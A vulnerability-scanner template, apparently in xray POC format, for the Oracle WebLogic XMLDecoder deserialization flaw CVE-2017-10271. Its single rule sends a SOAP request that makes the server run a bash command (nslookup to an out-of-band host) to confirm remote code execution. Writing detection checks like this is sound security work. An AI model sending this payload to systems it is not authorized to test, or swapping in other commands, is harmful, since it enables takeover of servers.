id: CVE-2017-10271

info:
  name: WebLogic XMLDecoder 反序列化漏洞 CVE-2017-10271
  author: dr_set
  severity: high
  description: Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent - WLS Security). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server.
  reference:
    - https://github.com/vulhub/vulhub/tree/fda47b97c7d2809660a4471539cd0e6dbf8fac8c/weblogic/CVE-2017-10271
    - https://github.com/SuperHacker-liuan/cve-2017-10271-poc

set:
    reverse: newReverse()
    reverseURL: reverse.url.host
rules:
    r0:
        request:
            method: POST
            path: /wls-wsat/CoordinatorPortType
            headers:
                Content-Type: text/xml
            body: |
                <?xml version="1.0" encoding="utf-8"?>
                <soapenv:Envelope
                    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
                    <soapenv:Header>
                        <work:WorkContext
                            xmlns:work="http://bea.com/2004/06/soap/workarea/">
                            <java version="1.4.0" class="java.beans.XMLDecoder">
                                <void class="java.lang.ProcessBuilder">
                                    <array class="java.lang.String" length="3">
                                        <void index="0">
                                            <string>/bin/bash</string>
                                        </void>
                                        <void index="1">
                                            <string>-c</string>
                                        </void>
                                        <void index="2">
                                            <string>nslookup {{reverseURL}}</string>
                                        </void>
                                    </array>
                                    <void method="start"/></void>
                            </java>
                        </work:WorkContext>
                    </soapenv:Header>
                    <soapenv:Body/>
                </soapenv:Envelope>
        expression: response.status == 500 && reverse.wait(3)
expression: r0()
